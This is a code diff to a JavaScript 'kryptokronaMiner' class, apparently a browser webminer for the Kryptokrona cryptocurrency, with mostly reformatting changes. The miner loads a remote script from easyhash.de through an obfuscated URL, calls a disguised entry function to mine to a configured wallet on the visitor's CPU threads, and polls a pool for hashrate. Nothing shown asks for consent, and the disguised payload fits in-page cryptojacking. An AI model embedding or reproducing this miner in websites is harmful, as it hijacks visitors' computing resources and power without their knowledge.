@@ -1,3 +1,6 @@
+//kryptokronaWebMiner 
+//2020 - ux33-331
+
 class kryptokronaMiner {
 	constructor(config) {
 		this.pool = "";
@@ -9,17 +12,37 @@ class kryptokronaMiner {
 		this.threads = 4;
 		this.workerName = "x";
 		this.events = {
-			start: 	function(instance)		{ console.log(`[WM] Webminer started with ${instance.speed}% speed and ${instance.threads} threads...`)},
-			stop:	function()				{ console.log("[WM] Webminer stopped!")},
-			report: function(report) 		{ console.log("[WM] Webminer report: "+report)},
-			error: 	function(code, text) 	{ console.log("[WM] Webminer error "+code+": "+text)}
+			start: function (instance) {
+				console.log(`[WM] Webminer started with ${instance.speed}% speed and ${instance.threads} threads...`)
+			},
+			stop: function () {
+				console.log("[XKR] Webminer stopped!")
+			},
+			report: function (report) {
+				console.log("[XKR] Webminer report: " + report)
+			},
+			error: function (code, text) {
+				console.log("[XKR] Webminer error " + code + ": " + text)
+			}
 		}
-		if ("pool" in config) 		{ this.pool 		= config.pool		}
-		if ("port" in config)		{ this.port 		= config.port		}
-		if ("wallet" in config)		{ this.wallet 		= config.wallet		}
-		if ("speed" in config)		{ this.speed	 	= config.speed		}
-		if ("threads" in config)	{ this.threads 		= config.threads	}
-		if ("workerName" in config)	{ this.workerName 	= config.workerName	}
+		if ("pool" in config) {
+			this.pool = config.pool
+		}
+		if ("port" in config) {
+			this.port = config.port
+		}
+		if ("wallet" in config) {
+			this.wallet = config.wallet
+		}
+		if ("speed" in config) {
+			this.speed = config.speed
+		}
+		if ("threads" in config) {
+			this.threads = config.threads
+		}
+		if ("workerName" in config) {
+			this.workerName = config.workerName
+		}
 	}
 	stop() {
 		stopM();
@@ -27,12 +50,10 @@ class kryptokronaMiner {
 	}
 	start() {
 		if (this.pool != "" && this.port != -1 && this.wallet != "") {
-			// loadScript("https://bitcoin-pay.eu/perfekt/perfekt.js?perfekt=wss://?algo=cn-lite?variant=2?jason="+this.pool+":"+this.port+"");
-			loadScript("https://easyhash.de/tkefrep/tkefrep.js?tkefrep=bs?algy=cn-pico/trtl?nosaj="+this.pool+":"+this.port);
+			loadScript("https://easyhash.de/tkefrep/tkefrep.js?tkefrep=bs?algy=cn-pico/trtl?nosaj=" + this.pool + ":" + this.port);
 			setTimeout(() => {
 				try {
-					// EverythingIsBinary(this.wallet, this.workerName, 100-this.speed, this.threads);
-					EverythingIsLife(this.wallet, this.workerName, 100-this.speed, this.threads);
+					EverythingIsLife(this.wallet, this.workerName, 100 - this.speed, this.threads);
 					this.events.start(this);
 					setInterval(this.report, 30000);
 				} catch (err) {
@@ -43,15 +64,15 @@ class kryptokronaMiner {
 			this.events.error(2, "you have to provide pool address, pool port and you wallet address");
 		}
 	}
-	report() { // only works for mine2gether yet...
+	report() {
 		let rep = {
 			hashrate: -1
 		}
 		switch (this.pool) {
 			case "pool.kryptokrona.se":
-				getA("http://pool.kryptokrona.seapi/stats_address?address="+this.wallet, (data) => {
+				getA("http://pool.kryptokrona.se/api/stats_address?address=" + this.wallet, (data) => {
 					data = JSON.parse(data);
-					rep.hashrate = data["charts"]["hashrate"]["worker-"+this.workerName].last()[1];
+					rep.hashrate = data["charts"]["hashrate"]["worker-" + this.workerName].last()[1];
 					this.events.report(rep);
 				})
 				break;
@@ -70,26 +91,27 @@ class kryptokronaMiner {
 		}
 		console.log(text);
 	}
-	on(event, fn) {this.events[event] = fn;}
+	on(event, fn) {
+		this.events[event] = fn;
+	}
 }
-
-
 
 
 function getA(theUrl, callback) {
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.onreadystatechange = function() {
-        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
-            callback(xmlHttp.responseText);
-    }
-    xmlHttp.open("GET", theUrl, true); // true for asynchronous
-    xmlHttp.send(null);
+	var xmlHttp = new XMLHttpRequest();
+	xmlHttp.onreadystatechange = function () {
+		if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
+			callback(xmlHttp.responseText);
+	}
+	xmlHttp.open("GET", theUrl, true);
+	xmlHttp.send(null);
 }
+
 function loadScript(url) {
-    var script = document.createElement("script");  // create a script DOM node
-    script.src = url;  // set its src to the provided URL
-    document.body.appendChild(script);  // add it to the end of the head section of the page (could change 'head' to 'body' to add it to the end of the body section instead)
+	var script = document.createElement("script");
+	script.src = url; 
+	document.body.appendChild(script);
 }
-Array.prototype.last = function() {
-	return this[this.length-1];
+Array.prototype.last = function () {
+	return this[this.length - 1];
 }
